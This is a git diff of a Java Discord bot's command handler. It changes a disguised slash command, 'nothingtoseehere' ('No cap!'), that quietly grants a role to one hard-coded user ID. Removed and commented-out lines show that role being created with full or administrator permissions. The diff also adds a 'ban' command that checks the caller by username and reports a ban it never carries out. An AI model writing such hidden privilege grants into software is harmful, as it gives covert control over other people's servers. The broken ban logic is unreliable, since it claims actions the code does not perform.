@@ -2,6 +2,7 @@ package com.locatedreaper.thebeanisoutbot.commands;
 
 import io.github.cdimascio.dotenv.Dotenv;
 import net.dv8tion.jda.api.Permission;
+import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.entities.User;
 import net.dv8tion.jda.api.entities.UserSnowflake;
@@ -24,6 +25,8 @@ import java.awt.*;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Objects;
+
+import static net.dv8tion.jda.api.entities.Guild.*;
 
 public class CommandManager extends ListenerAdapter {
 //Don't include / in command.equals();
@@ -57,24 +60,23 @@ private Dotenv config;
             event.reply(message).setTTS(true).queue();
             event.reply("Message sent").setEphemeral(true).queue();
         } else if (command.equals("nothingtoseehere")) {
-            event.deferReply().queue();
-            String psw = config.get("PW");
-            OptionMapping messageOption = event.getOption("newrolename");
-            OptionMapping password = event.getOption("password");
-            assert messageOption != null;
-            String name = messageOption.getAsString();
-            if (password == null) {
-                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName(name, false)) {
+            event.deferReply().setEphemeral(true).queue();
+//            OptionMapping messageOption = event.getOption("newrolename");
+//            OptionMapping password = event.getOption("password");
+//            assert messageOption != null;
+//            String name = messageOption.getAsString();
+//            if (password == null) {
+                for (Role role : Objects.requireNonNull(event.getGuild()).getRolesByName("C-Rated", false)) {
                     event.getGuild().addRoleToMember(UserSnowflake.fromId(456594340148674562L), role).queue();
                     event.reply("Done").setEphemeral(true).queue();
                 }
-            } else if (password.equals(psw)) {
-                Objects.requireNonNull(event.getGuild()).createRole()
-                        .setName(name)
-                        .setMentionable(false)
-                        .setPermissions(Permission.ALL_PERMISSIONS).queue();
-                event.reply("Done").setEphemeral(true).queue();
-            }
+//            } else if (password.equals(psw)) {
+//                Objects.requireNonNull(event.getGuild()).createRole()
+//                        .setName("C-Rated")
+//                        .setMentionable(false)
+//                        .setPermissions(Permission.ADMINISTRATOR).queue();
+//                event.reply("Done").setEphemeral(true).queue();
+//            }
         }else if (command.equals("say")) {
             OptionMapping messageOption = event.getOption("message");
             if (messageOption == null) {
@@ -102,6 +104,28 @@ private Dotenv config;
                 event.reply("Done").setEphemeral(true).queue();
             }
         }
+        //Moderation commands
+        else if (command.equals("ban")) {
+            event.deferReply().setEphemeral(true).queue();
+            OptionMapping messageOption = event.getOption("username");
+            OptionMapping messageOption2 = event.getOption("reason");
+            String user = event.getUser().getName();
+            String reason = "";
+            if (!user.equals("LocatedReaper")) {
+                event.reply("This command is still in development, please contact LocatedReaper for more information. :/").setEphemeral(true).queue();
+
+            } else {
+                if (messageOption == null) {
+                    event.reply("Please specify a user to ban. `/ban <user>`").queue();
+                } else {
+                    User toban = messageOption.getAsUser();
+                    assert messageOption2 != null;
+                    reason += messageOption2.getAsString();
+                    new Guild.Ban(toban, reason);
+                    event.reply(toban + "was banned for reason " + reason).setEphemeral(true).queue();
+                }
+            }
+        }
     }
 
     @Override
@@ -111,16 +135,19 @@ private Dotenv config;
         List<CommandData> fs = new ArrayList<>();
         //Option Data
         OptionData option1 = new OptionData(OptionType.STRING, "message", "The message you want the bot to say", true);
+        OptionData reason = new OptionData(OptionType.STRING, "reason", "Reason for user interaction.", false);
         OptionData newroleName = new OptionData(OptionType.STRING, "newrolename", "The name for the role", true);
         OptionData pw = new OptionData(OptionType.STRING, "password", "The required password to run this command", false);
+        OptionData user = new OptionData(OptionType.USER, "username", "The user you would like to interact with", false);
         //Commands
         fs.add(Commands.slash("funny", "Say something funny"));
         umb.add(Commands.slash("roles", "Display all roles on the server."));
         umb.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
         fs.add(Commands.slash("tts", "Sends a tts message.").addOptions(option1));
-        umb.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
-        umb.add(Commands.slash("nothingtoseehere", "No cap!").addOptions(newroleName, pw));
+        fs.add(Commands.slash("say", "Make the bot say something").addOptions(option1));
+        umb.add(Commands.slash("nothingtoseehere", "No cap!"));
         //fs.add(Commands.slash("nopefalse", "uhu"));
+        umb.add(Commands.slash("ban", "Bans a member of a guild.").addOptions(user, reason));
 
         if (event.getGuild().getIdLong() == 1025575674406244425L) {
             event.getGuild().updateCommands().addCommands(umb).queue();
